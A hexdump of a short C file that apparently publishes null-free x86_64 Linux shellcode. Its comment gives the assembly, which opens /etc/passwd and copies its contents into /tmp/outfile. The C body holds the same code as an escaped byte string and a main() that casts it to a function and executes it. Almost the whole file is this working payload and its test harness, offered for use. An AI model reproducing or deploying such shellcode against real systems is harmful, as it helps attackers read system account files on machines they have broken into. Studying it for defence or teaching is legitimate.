00000000  2f 2a 0a 52 65 61 64 73  20 64 61 74 61 20 66 72  |/*.Reads data fr|
00000010  6f 6d 20 2f 65 74 63 2f  70 61 73 73 77 64 20 74  |om /etc/passwd t|
00000020  6f 20 2f 74 6d 70 2f 6f  75 74 66 69 6c 65 0a 4e  |o /tmp/outfile.N|
00000030  6f 20 6e 75 6c 6c 20 62  79 74 65 73 0a 20 0a 41  |o null bytes. .A|
00000040  75 74 68 6f 72 3a 20 43  68 72 69 73 20 48 69 67  |uthor: Chris Hig|
00000050  67 69 6e 73 20 3c 63 68  72 69 73 40 63 68 69 67  |gins <chris@chig|
00000060  73 2e 6d 65 3e 0a 20 20  20 20 20 20 20 20 40 63  |s.me>.        @c|
00000070  68 31 67 67 31 6e 73 20  2d 2d 20 67 69 74 68 75  |h1gg1ns -- githu|
00000080  62 2e 63 6f 6d 2f 63 68  69 67 67 69 6e 73 0a 20  |b.com/chiggins. |
00000090  20 20 20 20 20 20 20 63  68 69 67 73 74 75 66 66  |       chigstuff|
000000a0  2e 63 6f 6d 0a 44 61 74  65 3a 20 20 20 33 2d 32  |.com.Date:   3-2|
000000b0  37 2d 32 30 31 34 0a 53  69 7a 65 3a 20 20 20 31  |7-2014.Size:   1|
000000c0  31 38 20 62 79 74 65 73  0a 54 65 73 74 65 64 3a  |18 bytes.Tested:|
000000d0  20 41 72 63 68 4c 69 6e  75 78 20 78 38 36 5f 36  | ArchLinux x86_6|
000000e0  34 20 33 2e 31 33 2e 36  2d 31 0a 41 73 73 65 6d  |4 3.13.6-1.Assem|
000000f0  62 6c 79 3a 0a 20 20 20  20 20 20 20 20 78 6f 72  |bly:.        xor|
00000100  20 72 61 78 2c 20 72 61  78 0a 20 20 20 20 20 20  | rax, rax.      |
00000110  20 20 6d 6f 76 20 61 6c  2c 20 32 0a 20 20 20 20  |  mov al, 2.    |
00000120  20 20 20 20 78 6f 72 20  72 64 69 2c 20 72 64 69  |    xor rdi, rdi|
00000130  0a 20 20 20 20 20 20 20  20 6d 6f 76 20 72 62 78  |.        mov rbx|
00000140  2c 20 30 78 36 34 37 37  37 33 0a 20 20 20 20 20  |, 0x647773.     |
00000150  20 20 20 70 75 73 68 20  72 62 78 0a 20 20 20 20  |   push rbx.    |
00000160  20 20 20 20 6d 6f 76 20  72 62 78 2c 20 30 78 37  |    mov rbx, 0x7|
00000170  33 36 31 37 30 32 66 36  33 37 34 36 35 32 66 0a  |361702f6374652f.|
00000180  20 20 20 20 20 20 20 20  70 75 73 68 20 72 62 78  |        push rbx|
00000190  0a 20 20 20 20 20 20 20  20 6c 65 61 20 72 64 69  |.        lea rdi|
000001a0  2c 20 5b 72 73 70 5d 0a  20 20 20 20 20 20 20 20  |, [rsp].        |
000001b0  78 6f 72 20 72 73 69 2c  20 72 73 69 0a 20 20 20  |xor rsi, rsi.   |
000001c0  20 20 20 20 20 73 79 73  63 61 6c 6c 0a 20 20 20  |     syscall.   |
000001d0  20 20 20 20 20 6d 6f 76  20 72 62 78 2c 20 72 61  |     mov rbx, ra|
000001e0  78 0a 20 20 20 20 20 20  20 20 78 6f 72 20 72 61  |x.        xor ra|
000001f0  78 2c 20 72 61 78 0a 20  20 20 20 20 20 20 20 6d  |x, rax.        m|
00000200  6f 76 20 72 64 69 2c 20  72 62 78 0a 20 20 20 20  |ov rdi, rbx.    |
00000210  20 20 20 20 6d 6f 76 20  72 73 69 2c 20 72 73 70  |    mov rsi, rsp|
00000220  0a 20 20 20 20 20 20 20  20 6d 6f 76 20 64 78 2c  |.        mov dx,|
00000230  20 30 78 46 46 46 46 0a  20 20 20 20 20 20 20 20  | 0xFFFF.        |
00000240  73 79 73 63 61 6c 6c 0a  20 20 20 20 20 20 20 20  |syscall.        |
00000250  6d 6f 76 20 72 38 2c 20  72 61 78 0a 20 20 20 20  |mov r8, rax.    |
00000260  20 20 20 20 6d 6f 76 20  72 61 78 2c 20 72 73 70  |    mov rax, rsp|
00000270  0a 20 20 20 20 20 20 20  20 78 6f 72 20 72 62 78  |.        xor rbx|
00000280  2c 20 72 62 78 0a 20 20  20 20 20 20 20 20 70 75  |, rbx.        pu|
00000290  73 68 20 72 62 78 0a 20  20 20 20 20 20 20 20 6d  |sh rbx.        m|
000002a0  6f 76 20 72 62 78 2c 20  30 78 36 35 36 63 36 39  |ov rbx, 0x656c69|
000002b0  36 36 0a 20 20 20 20 20  20 20 20 70 75 73 68 20  |66.        push |
000002c0  72 62 78 0a 20 20 20 20  20 20 20 20 6d 6f 76 20  |rbx.        mov |
000002d0  72 62 78 2c 20 30 78 37  34 37 35 36 66 32 66 37  |rbx, 0x74756f2f7|
000002e0  30 36 64 37 34 32 66 0a  20 20 20 20 20 20 20 20  |06d742f.        |
000002f0  70 75 73 68 20 72 62 78  0a 20 20 20 20 20 20 20  |push rbx.       |
00000300  20 6d 6f 76 20 72 62 78  2c 20 72 61 78 0a 20 20  | mov rbx, rax.  |
00000310  20 20 20 20 20 20 78 6f  72 20 72 61 78 2c 20 72  |      xor rax, r|
00000320  61 78 0a 20 20 20 20 20  20 20 20 6d 6f 76 20 61  |ax.        mov a|
00000330  6c 2c 20 32 0a 20 20 20  20 20 20 20 20 6c 65 61  |l, 2.        lea|
00000340  20 72 64 69 2c 20 5b 72  73 70 5d 0a 20 20 20 20  | rdi, [rsp].    |
00000350  20 20 20 20 78 6f 72 20  72 73 69 2c 20 72 73 69  |    xor rsi, rsi|
00000360  0a 20 20 20 20 20 20 20  20 70 75 73 68 20 30 78  |.        push 0x|
00000370  36 36 0a 20 20 20 20 20  20 20 20 70 6f 70 20 73  |66.        pop s|
00000380  69 0a 20 20 20 20 20 20  20 20 73 79 73 63 61 6c  |i.        syscal|
00000390  6c 0a 20 20 20 20 20 20  20 20 6d 6f 76 20 72 64  |l.        mov rd|
000003a0  69 2c 20 72 61 78 0a 20  20 20 20 20 20 20 20 78  |i, rax.        x|
000003b0  6f 72 20 72 61 78 2c 20  72 61 78 0a 20 20 20 20  |or rax, rax.    |
000003c0  20 20 20 20 6d 6f 76 20  61 6c 2c 20 31 0a 20 20  |    mov al, 1.  |
000003d0  20 20 20 20 20 20 6c 65  61 20 72 73 69 2c 20 5b  |      lea rsi, [|
000003e0  72 62 78 5d 0a 20 20 20  20 20 20 20 20 78 6f 72  |rbx].        xor|
000003f0  20 72 64 78 2c 20 72 64  78 0a 20 20 20 20 20 20  | rdx, rdx.      |
00000400  20 20 6d 6f 76 20 72 64  78 2c 20 72 38 0a 20 20  |  mov rdx, r8.  |
00000410  20 20 20 20 20 20 73 79  73 63 61 6c 6c 0a 2a 2f  |      syscall.*/|
00000420  0a 20 0a 23 69 6e 63 6c  75 64 65 20 3c 73 74 64  |. .#include <std|
00000430  69 6f 2e 68 3e 0a 23 69  6e 63 6c 75 64 65 20 3c  |io.h>.#include <|
00000440  73 74 72 69 6e 67 2e 68  3e 0a 20 0a 63 68 61 72  |string.h>. .char|
00000450  20 73 68 65 6c 6c 63 6f  64 65 5b 5d 20 3d 20 22  | shellcode[] = "|
00000460  5c 78 34 38 5c 78 33 31  5c 78 63 30 5c 78 62 30  |\x48\x31\xc0\xb0|
00000470  5c 78 30 32 5c 78 34 38  5c 78 33 31 5c 78 66 66  |\x02\x48\x31\xff|
00000480  5c 78 62 62 5c 78 37 33  5c 78 37 37 5c 78 36 34  |\xbb\x73\x77\x64|
00000490  5c 78 30 30 5c 78 35 33  5c 78 34 38 5c 78 62 62  |\x00\x53\x48\xbb|
000004a0  5c 78 32 66 5c 78 36 35  5c 78 37 34 5c 78 36 33  |\x2f\x65\x74\x63|
000004b0  5c 78 37 30 5c 78 36 31  5c 78 37 33 5c 78 35 33  |\x70\x61\x73\x53|
000004c0  5c 78 34 38 5c 78 38 64  5c 78 33 63 5c 78 32 34  |\x48\x8d\x3c\x24|
000004d0  5c 78 34 38 5c 78 33 31  5c 78 66 36 5c 78 30 66  |\x48\x31\xf6\x0f|
000004e0  5c 78 30 35 5c 78 34 38  5c 78 38 39 5c 78 63 33  |\x05\x48\x89\xc3|
000004f0  5c 78 34 38 5c 78 33 31  5c 78 63 30 5c 78 34 38  |\x48\x31\xc0\x48|
00000500  5c 78 38 39 5c 78 64 66  5c 78 34 38 5c 78 38 39  |\x89\xdf\x48\x89|
00000510  5c 78 65 36 5c 78 36 36  5c 78 62 61 5c 78 66 66  |\xe6\x66\xba\xff|
00000520  5c 78 66 66 5c 78 30 66  5c 78 30 35 5c 78 34 39  |\xff\x0f\x05\x49|
00000530  5c 78 38 39 5c 78 63 30  5c 78 34 38 5c 78 38 39  |\x89\xc0\x48\x89|
00000540  5c 78 65 30 5c 78 34 38  5c 78 33 31 5c 78 64 62  |\xe0\x48\x31\xdb|
00000550  5c 78 35 33 5c 78 62 62  5c 78 36 36 5c 78 36 39  |\x53\xbb\x66\x69|
00000560  5c 78 36 63 5c 78 36 35  5c 78 35 33 5c 78 34 38  |\x6c\x65\x53\x48|
00000570  5c 78 62 62 5c 78 32 66  5c 78 37 34 5c 78 36 64  |\xbb\x2f\x74\x6d|
00000580  5c 78 37 30 5c 78 36 66  5c 78 37 35 5c 78 37 34  |\x70\x6f\x75\x74|
00000590  5c 78 35 33 5c 78 34 38  5c 78 38 39 5c 78 63 33  |\x53\x48\x89\xc3|
000005a0  5c 78 34 38 5c 78 33 31  5c 78 63 30 5c 78 62 30  |\x48\x31\xc0\xb0|
000005b0  5c 78 30 32 5c 78 34 38  5c 78 38 64 5c 78 33 63  |\x02\x48\x8d\x3c|
000005c0  5c 78 32 34 5c 78 34 38  5c 78 33 31 5c 78 66 36  |\x24\x48\x31\xf6|
000005d0  5c 78 36 61 5c 78 36 36  5c 78 36 36 5c 78 35 65  |\x6a\x66\x66\x5e|
000005e0  5c 78 30 66 5c 78 30 35  5c 78 34 38 5c 78 38 39  |\x0f\x05\x48\x89|
000005f0  5c 78 63 37 5c 78 34 38  5c 78 33 31 5c 78 63 30  |\xc7\x48\x31\xc0|
00000600  5c 78 62 30 5c 78 30 31  5c 78 34 38 5c 78 38 64  |\xb0\x01\x48\x8d|
00000610  5c 78 33 33 5c 78 34 38  5c 78 33 31 5c 78 64 32  |\x33\x48\x31\xd2|
00000620  5c 78 34 63 5c 78 38 39  5c 78 63 32 5c 78 30 66  |\x4c\x89\xc2\x0f|
00000630  5c 78 30 35 22 3b 0a 20  0a 69 6e 74 20 6d 61 69  |\x05";. .int mai|
00000640  6e 28 29 20 7b 0a 20 20  20 20 70 72 69 6e 74 66  |n() {.    printf|
00000650  28 22 6c 65 6e 3a 20 25  64 20 62 79 74 65 73 22  |("len: %d bytes"|
00000660  2c 20 73 69 7a 65 6f 66  20 73 68 65 6c 6c 63 6f  |, sizeof shellco|
00000670  64 65 29 3b 0a 20 20 20  20 28 2a 28 76 6f 69 64  |de);.    (*(void|
00000680  20 28 2a 29 28 29 29 20  73 68 65 6c 6c 63 6f 64  | (*)()) shellcod|
00000690  65 29 3b 0a 20 20 20 20  72 65 74 75 72 6e 20 30  |e);.    return 0|
000006a0  3b 0a 7d                                          |;.}|
000006a3
